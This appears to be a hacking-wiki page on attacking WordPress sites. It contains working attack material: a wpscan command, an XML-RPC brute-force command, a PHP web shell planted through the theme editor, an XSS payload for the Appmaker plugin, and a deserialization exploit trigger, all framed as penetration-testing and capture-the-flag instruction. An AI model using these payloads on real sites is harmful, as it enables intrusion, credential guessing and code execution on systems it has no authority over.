---
description: A popular Content Management System (CMS) for static content, with a visual UI
---

# WordPress

## # Related Pages

{% content-ref url="../../languages/php.md" %}
[php.md](../../languages/php.md)
{% endcontent-ref %}

## WPScan

The state-of-the-art security scanner for WordPress is `wpscan`, checking and enumerating many different vulnerabilities from plugins, backup files, and other WordPress-specific errors.&#x20;

{% embed url="https://wpscan.com/wordpress-cli-scanner" %}
WordPerss security scanner
{% endembed %}

See the [API Setup](https://github.com/wpscanteam/wpscan?tab=readme-ov-file#optional-wordpress-vulnerability-database-api) for instructions on how to use their API to get real-time updates of vulnerability data such as versions of plugins. This is highly recommended to make sure you find the newest CVEs.

The following command starts such a scan with extra options enabled and writes the output to a file:

{% code overflow="wrap" %}
```bash
wpscan --url http://$IP --enumerate ap --plugins-detection aggressive --plugins-version-detection aggressive -o wpscan.txt
```
{% endcode %}

The results of such a scan often reveal outdated plugins with vulnerabilities, and/or generic misconfigurations to exploit. Use a search engine here when unsure about exploiting a certain finding.

## XML RPC Brute Force

One vulnerability that is infamous with WordPress is the `/xmlrpc.php` file being public. But what is the real risk you may ask? The main risk is the `system.multicall()` function that you can interact with to send multiple XML RPC requests simultaneously, and the server will process them all separately.&#x20;

You can imagine that for a heavy request, this can amplify one request into a ton of load on the server, possibly resulting in a **Denial of Service** (DoS). Another idea is using the fact that you can send lots of request at the same time to bypass a rate limit, for password attempts, for example. There exists an RPC call to log in with a username and password to the administrator panel, and with this technique you can do so hundreds of times in one request, significantly speeding up the process ([more details](https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/)).

The following tool implements this idea by guessing many passwords from a wordlist:

{% embed url="https://github.com/aress31/xmlrpc-bruteforcer" %}
Tool to brute force WordPress passwords using XML RPC multicall
{% endembed %}

```bash
xmlrpc-bruteforcer -u $USERNAME -w /list/rockyou.txt -x http://$IP/xmlrpc.php
```

## Authenticated RCE

When authenticated **as an admin**, you can make any changes to the site. This also means you can edit the PHP code that is executed whenever a page is visited, allowing you to write code that executes shell commands.

You should be able to access **Tools** -> **Theme File Editor** to edit the current theme:

```bash
$BASE_URL/wp-admin/theme-editor.php
```

Then, select any `.php` file you think will be executed when you visit a page. By default, there is a `functions.php` file that every other file includes, so it will always be run. Edit such a file to include any PHP code you want to execute:

```php
<?php
system($_GET["cmd"]);
```

After saving, you should be able to access the page to run the code:

```bash
$BASE_URL/?cmd=id
```

{% hint style="warning" %}
If this does not work for any reason, alternatives include the **Tools** -> **Plugin File Editor** with any plugin, then activate it at **Plugins** -> **Installed Plugins** to trigger the code:

<pre class="language-php"><code class="lang-php"><strong>&#x3C;?php
</strong><strong>system("id > /tmp/pwned");
</strong></code></pre>

As a last option, you can always upload your own malicious plugin like this:\
[https://github.com/wetw0rk/malicious-wordpress-plugin](https://github.com/wetw0rk/malicious-wordpress-plugin)
{% endhint %}

## Custom Plugins

WordPress can be extended by installing plugins, either through the store or manually by adding them to the `wp-content/plugins/` folder. Custom plugins may contain security vulnerabilities and are a very common source of WordPress issues that [#wpscan](wordpress.md#wpscan "mention") also searches for.&#x20;

### Inputs

Plugins can add several new inputs to an application that may be vulnerable to all kinds of attacks. Important to know when auditing them is knowing how you can call them.&#x20;

Starting with **actions**, these can be registered with `add_action()` and their name must be prefixed with `wp_ajax` to be accessible via the web ajax endpoint. By default, these actions require authentication of any (low-privilege) user. Registering them is done by passing a "callable" as the second argument, which may be a function name that PHP calls. See the following example:

<pre class="language-php" data-title="Authenticated Action"><code class="lang-php"><strong>add_action("wp_ajax_get_flag", "get_flag_request_callback");
</strong>
function get_flag_request_callback() {
    $value = file_get_contents('/flag.txt');
    wp_send_json_success(["value" => $value]);  // Send a JSON response
}
</code></pre>

Another more interesting action for hackers is an unauthenticated one. With the `nopriv` prefix, this automatically allows any request without authentication to run the callback function:

<pre class="language-php" data-title="Unauthenticated Action"><code class="lang-php"><strong>add_action("wp_ajax_<a data-footnote-ref href="#user-content-fn-1">nopriv</a>_reset_key", "reset_password_key_callback");
</strong>
function reset_password_key_callback() {
    $user_id = $_POST["user_id"];  // Also takes regular input
    ...
</code></pre>

Anyone can call such an API with the `/wp-admin/admin-ajax.php` endpoint, which requires a `?action=` parameter set to the **name after the prefix**, for example:

```http
POST /wp-admin/admin-ajax.php?action=reset_key HTTP/1.1
Host: localhost:1337
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

user_id=2
```

***

Another type of input adding routes to the REST API at `/wp-json`. These are often registered at the `rest_api_init` action and use the `register_rest_route()` function to give a namespace and endpoint to request. The callback function will run when a request passes the permission check:

<pre class="language-php" data-title="REST API Registration"><code class="lang-php"><strong>add_action("rest_api_init", "register_user_creation_endpoint");
</strong>
function register_user_creation_endpoint() {
<strong>    register_rest_route("user/v1", "/create", [
</strong><strong>        "methods" => "POST",
</strong><strong>        "callback" => "create_user_via_api",
</strong><strong>        "permission_callback" => "__return_true", // Allow anyone to access this endpoint
</strong><strong>    ]);
</strong>}

function create_user_via_api($request) {
    $parameters = $request->get_json_params();  // Has more custom functions like JSON input
    $username = sanitize_text_field($parameters["username"]);
    ...
</code></pre>

Any unauthenticated user can request this endpoint because the `permission_callback` always returns true. A request like the following would be parsed by the callback function:

```http
POST /wp-json/user/v1/create HTTP/1.1
Host: challenge.nahamcon.com:31587
Content-Type: application/json
Content-Length: 23

{"username": "example"}
```

### Exploitation

Because any user can access authenticated actions, plugin developers should check the roles of the current user to prevent unauthorized access. The following example shows how both an `administrator` and `subscriber` may run this code:

{% code title="Role Authorization check" %}
```php
$user = wp_get_current_user();
$allowed_roles = ["administrator", "subscriber"];

if (array_intersect($allowed_roles, $user->roles)) {
    ...
}
```
{% endcode %}

Another interesting piece of code to look at is `wp-login.php` from WordPress itself. The `?action=` parameter is used in a switch statement to execute various different pieces of logic involving user accounts:

{% code title="wp-login.php" %}
```php
switch ( $action ) {
	case 'confirm_admin_email':
	case 'confirm_admin_email':
	case 'postpass':
	case 'logout':
	case 'lostpassword':
	case 'retrievepassword':
	case 'resetpass':
	case 'rp':
	case 'register':
	case 'checkemail':
	case 'confirmaction':
	case 'login':
}
```
{% endcode %}

In one vulnerability, the password reset token was generated in an insecure way, which allowed you to run the `resetpass` action on `wp-login.php` to choose a new password for the user. If you check the source code that handles this action you can see that it handles the `key` and `login` parameters for the reset key and username respectively:

```http
GET /wp-login.php?action=resetpass&key=$USER_ACTIVATION_KEY&login=admin HTTP/1.1
Host: localhost:1337
```

### Common Pitfalls

Some easy mistakes to make when writing custom WordPress plugins. This ranges from unintuitive behaviour to some previous CVEs in other plugins.

#### `is_admin()` as privilege check

Functions like [`current_user_can`](https://developer.wordpress.org/reference/functions/current_user_can/) should be used to check the permissions of the currently logged-in user. A developer who doesn't fully read the documentation may encounter the [`is_admin()`](https://developer.wordpress.org/reference/functions/is_admin/) function that sounds like it _should_ check if the current user is an administrator.\
However, this is not the case! It instead checks if the _current path_ is to an administrator page. Any user can make a request to `/wp-admin/`, the `/wp-admin/admin-ajax.php` handler for example triggers this too.

{% embed url="https://wordfence.com/learn/how-to-prevent-authentication-bypass-attacks/" %}
Explaining the `is_admin()` confusion
{% endembed %}

Below is a list of all default **permissions per role** for reference:

1. **Super Admin**
   * Complete Control of **Multi-Site Networks**
2. **Admin**
   * Change **Themes**
   * Add and Remove **Widgets** from Sidebar
   * Activate and Deactivate **Plugins**
   * **Add** and **Remove** _Other Users_
   * Change **Roles** of _Other Users_
3. **Editor**
   * Edit, Delete, or Approve **Comments**
   * Add, Edit or Delete **Tags**
   * Add, Edit, or Delete **Categories**
   * Add and Remove **Links**
   * Edit or Delete Published **Posts** by _Any User_
   * Write _Own_ **Page**s
   * Edit or Delete Published **Pages** by _Any User_
   * Edit or Delete **Media** Files
4. **Author**
   * Upload **Media** Files
5. **Contributor**
   * View **Comments**
   * Write _Own_ **Posts**
   * Edit _Own_ **Posts**
6. **Subscriber**
   * Edit _Own_ **Profile**

#### [cross-site-scripting-xss](../client-side/cross-site-scripting-xss/ "mention") in Appmaker

A **Reflected XSS** vulnerability was reported in Appmaker <= 1.36.12 ([details](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/appmaker-woocommerce-mobile-app-manager/appmaker-convert-woocommerce-to-android-ios-native-mobile-apps-13612-reflected-cross-site-scripting)). One of its files looks like this, with a vulnerability in the `hook_payment_footer()` method:

<pre class="language-php" data-title="class-appmaker-wc-general-hooks.php"><code class="lang-php">class APPMAKER_WC_General_hooks {
    public function __construct() {
        ...
        if ( ! empty( $_GET['payment_from_app'] ) ) {
            add_action( 'wp_head', array( $this, 'hook_stripe_enable_headers' ) );
<strong>            add_action( 'wp_footer', array( $this, 'hook_payment_footer' ) );
</strong>        }
    }
    ...
    public function hook_payment_footer() {
<strong>        $gateway = isset( $_GET['payment_gateway'] ) ? $_GET['payment_gateway'] : '';
</strong>        $output  = '
                &#x3C;script type="text/javascript">
                window.onload = function() { 
                    setTimeout(function(){
                ';
        if ( ! empty( $gateway ) ) {
<strong>            $output .= "\n\t\t" . 'document.getElementById("payment_method_' . $gateway . '").checked = true;';
</strong>            $output .= "\n\t\t" . 'document.getElementById("payment_method_' . $gateway . '").click();';
        }
        
new APPMAKER_WC_General_hooks();
</code></pre>

The `?payment_gateway=` parameter is placed directly into the DOM here. It is easily abused by closing the script tag, and then opening a new one with malicious JavaScript. This works from any page as the footer is always loaded.

<pre class="language-php" data-title="plugin.php"><code class="lang-php">class APPMAKER_WC {
    ...
        public static function init() {
		...
                // Unconditionally loads this class
<strong>		require_once dirname( __FILE__ ) . '/lib/class-appmaker-wc-general-hooks.php';
</strong>

<strong>add_action( 'plugins_loaded', array( 'APPMAKER_WC', 'init' ) );
</strong></code></pre>

{% code title="Payload" overflow="wrap" %}
```url
/?payment_from_app=1&payment_gateway=</script><img%20src%20onerror=alert(origin)>
```
{% endcode %}

#### Insecure Deserialization in Social Media Share Buttons

The [social-media-builder](https://wordpress.org/plugins/social-media-builder/) plugin is no longer available for download due to a "Security Issue". It turns out that this is an **authenticated Insecure Deserialization** vulnerability. When calling the `import_buttons` action, the following code is triggered:

<pre class="language-php"><code class="lang-php">class SGMBButton
{
	public $id;
	public $title;
	public $options = array();

	public function init()
	{
            ...
            //! This can be accessed from any authenticated user
<strong>            add_action('wp_ajax_import_buttons', array($this,'importButtons'));
</strong>	}
    
...

public function importButtons()
{
    global $wpdb;
<strong>    $url = $_POST['attachmentUrl'];
</strong><strong>    $contents = unserialize(file_get_contents($url));
</strong>    foreach ($contents as $content) {
        $title = $content->title;
        $options = $content->options;
        $sql = $wpdb->prepare("INSERT INTO ".$wpdb->prefix.'sgmb_widget'."(title, options) VALUES (%s, %s)", $title, $options);
        $res = $wpdb->query($sql);
        echo 'MainRes: '.$res;
    }
}
</code></pre>

A URL inside `?attachmentUrl=` is fetched and unserialized. If the server allows it, you can use a `data:` URI with base64 to return arbitrary content to be deserialized. A JavaScript snippet that triggers this is below:

{% code title="Exploit" %}
```javascript
const payload = `INSERT_DESERIALIZATION_EXPLOIT_HERE`;

fetch("/wp-admin/admin-ajax.php?action=import_buttons", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: "attachmentUrl=data://text/plain;base64," + btoa(payload),
});
```
{% endcode %}

Replace `INSERT_DESERIALIZATION_EXPLOIT_HERE` with a PHP deserialization gadget chain that may require other outdated libraries or custom code.

[^1]: "nopriv" here implies unauthenticated&#x20;
